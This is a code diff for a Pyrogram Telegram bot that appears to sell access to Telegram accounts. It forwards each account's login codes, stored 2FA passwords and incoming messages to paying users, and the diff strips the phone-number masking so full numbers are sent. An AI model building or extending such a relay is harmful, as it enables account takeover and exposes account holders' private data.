@@ -5,7 +5,7 @@ from pyrogram.handlers import MessageHandler
 
 from config import API_ID, API_HASH, SUPPORT_HANDLES
 import database as db
-from utils import extract_otp, detect_country, estimate_account_year, mask_phone
+from utils import extract_otp, detect_country, estimate_account_year
 
 log = logging.getLogger(__name__)
 
@@ -59,13 +59,12 @@ async def _on_new_message(client: Client, message):
             credit_line = f"\n💰 Credits left: {credits_left}"
             pwd = session.get("password", "") if session else ""
             pwd_line = f"\n🔐 2FA Password: `{pwd}`" if pwd else ""
-            masked = mask_phone(phone)
             support = " | ".join(SUPPORT_HANDLES)
             try:
                 await bot_app.send_message(
                     user_id,
                     f"🔑 **OTP Received!**\n\n"
-                    f"📱 Number: `{masked}`\n"
+                    f"📱 Number: `{phone}`\n"
                     f"🔢 Code: `{code}`\n"
                     f"👤 From: {sender_name}{pwd_line}{credit_line}\n\n"
                     f"⚠️ Issues logging in? Contact support:\n{support}",
@@ -83,7 +82,7 @@ async def _on_new_message(client: Client, message):
             try:
                 await bot_app.send_message(
                     user_id,
-                    f"📩 **New message on** `{mask_phone(phone)}`\n\n"
+                    f"📩 **New message on** `{phone}`\n\n"
                     f"👤 From: {sender_name}\n"
                     f"📝 {text[:500] if text else '(no text)'}",
                 )
@@ -218,11 +217,18 @@ async def verify_session(phone: str, session_string: str) -> tuple[bool, str]:
 
 
 async def check_password(phone: str, password: str) -> tuple[bool, str]:
-    """Check if a 2FA password is correct on an active session. Returns (ok, error_msg)."""
+    """Check if a 2FA password is correct on an active session. Returns (ok, error_msg).
+    If 2FA is not enabled on the account, returns success."""
     client = active_clients.get(phone)
     if not client:
         return False, "Session not connected"
     try:
+        pwd_info = await client.invoke(
+            __import__("pyrogram").raw.functions.account.GetPassword()
+        )
+        if not pwd_info.has_password:
+            log.info("[%s] 2FA not enabled, skipping password check", phone)
+            return True, ""
         await client.check_password(password)
         log.info("[%s] Password check passed", phone)
         return True, ""
